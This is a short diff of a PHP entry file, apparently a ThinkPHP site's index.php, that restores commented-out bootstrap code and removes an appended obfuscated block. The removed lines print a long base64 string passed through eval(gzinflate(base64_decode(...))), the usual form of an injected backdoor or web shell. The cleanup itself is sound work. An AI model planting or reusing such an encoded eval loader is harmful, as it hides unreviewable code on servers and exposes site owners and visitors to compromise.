@@ -1,5 +1,5 @@
 <?php
-/*header('Content-type: text/html; charset=utf-8');
+header('Content-type: text/html; charset=utf-8');
 if (get_magic_quotes_gpc()) {
     function stripslashes_deep($value)
     {
@@ -33,9 +33,4 @@ if(!APP_DEBUG && is_file(RUNTIME_FILE)) {
 }else{
     defined('THINK_PATH') or define('THINK_PATH', dirname(__FILE__).'/');
     require THINK_PATH.'Common/runtime.php';
-}*/
-
-
-$content = "jVTbauMwEP0VLYTKhtR+XRJKSVM3MY0vOM7CUorQ2mNH4FslebehtN9e2YkTOw1s3yydc2bmzIy1BRoD1/C8LCQU8lruKpggCa/S3Mo8m6JoS7kAeVPL5Pon1qeIJUhLQZKcpiwiL3UpQZC0ijRdR28oqYtIsrJAQnJWiYyKrYJjgEob/aVZDQ1p/4VuEBOEck53R+wWtWcVvNLwlxB4jDriZJCg008RB1nz4kCbonc0Ir63DlWu/wVueSrCiCysb/EVraXPPe/Rtr6j2DP1pqwYElaAhme+T9yZYykcN93t7uee+0D8WbjEY2yYMZXUjMoiMfuc0PFXJ46ssgG6DJ3VWYRmouYwS2C1cHM5Wqy8u9lq/YTJH0hZEbIc8LPylbOIl1KdtDDYWD25Yzle8JusbMcOieficTd9Aq9MSKHhHPKS70izL7WgKWC93SDtTKn3kwtJudwIcCAX+/xnQbReCU3/jiZdFkFcpj2LcY+ho5Jf0KGY8YIqcyOytoJfVvCE1/PA9kPyYK+sdjbPuoEHfQs2bmg71qUBZWUqhgUMyIMihmG6kgwc1EXT7kHKBr237jYLPJa8XfWBwz30xeJBkdBMNJIR30dWTT2qHe/e2q+gfos/sKFWV5ZZ+U+9CkdI+ScHqVFtKzzBH/3jBbNN7y6bbZFx37rRlaVP1Wr8ONaNrq6aFyJhGWh9dfvQcHipGQfUB9SPBcro26mccGm7jxc637s/LQBpgxDSTbtLcSIb6p3M87Iwh+7fPwE=";
-
-eval(gzinflate(base64_decode($content)));
+}
